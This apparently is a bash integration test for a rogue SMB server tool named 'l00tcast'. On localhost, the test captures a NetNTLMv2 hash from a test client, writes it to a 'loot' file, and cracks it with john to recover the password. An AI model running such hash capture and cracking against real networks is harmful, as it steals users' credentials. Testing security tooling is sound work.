#!/usr/bin/env bash
# Integration test: drive the rogue SMB server with a real SMB client
# (smbclient) and assert a well-formed NetNTLMv2 is captured. If john is
# present, also crack it to prove the hash is valid.
set -u
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
BIN="${L00TCAST_BIN:-$ROOT/target/release/l00tcast}"
[ -x "$BIN" ] || { echo "build first: cargo build --release"; exit 2; }
command -v smbclient >/dev/null || { echo "smbclient not installed; skipping"; exit 0; }

WORK="$(mktemp -d)"; trap 'kill $(jobs -p) 2>/dev/null; rm -rf "$WORK"' EXIT
PORT=4457
"$BIN" -I 127.0.0.1 --smb --smb-port "$PORT" -o "$WORK/loot.txt" >/dev/null 2>"$WORK/err" &
for _ in $(seq 1 40); do grep -q 'capturing NetNTLM' "$WORK/err" && break; sleep 0.2; done

smbclient //127.0.0.1/share -p "$PORT" -U 'victim%Passw0rd!' -W WORKLAB -c 'ls' >/dev/null 2>&1
sleep 0.5

grep -qE '^victim::WORKLAB:1122334455667788:[0-9a-f]{32}:[0-9a-f]+' "$WORK/loot.txt" \
  || { echo "FAIL: no NetNTLMv2 captured"; cat "$WORK/loot.txt"; exit 1; }
echo "OK: captured NetNTLMv2"

if command -v john >/dev/null; then
  printf 'admin\nPassw0rd!\nletmein\n' > "$WORK/wl"
  john --format=netntlmv2 --wordlist="$WORK/wl" "$WORK/loot.txt" >/dev/null 2>&1
  john --show --format=netntlmv2 "$WORK/loot.txt" 2>/dev/null | grep -q 'victim:Passw0rd!' \
    && echo "OK: hash cracked back to the real password" \
    || { echo "FAIL: hash did not crack"; exit 1; }
fi
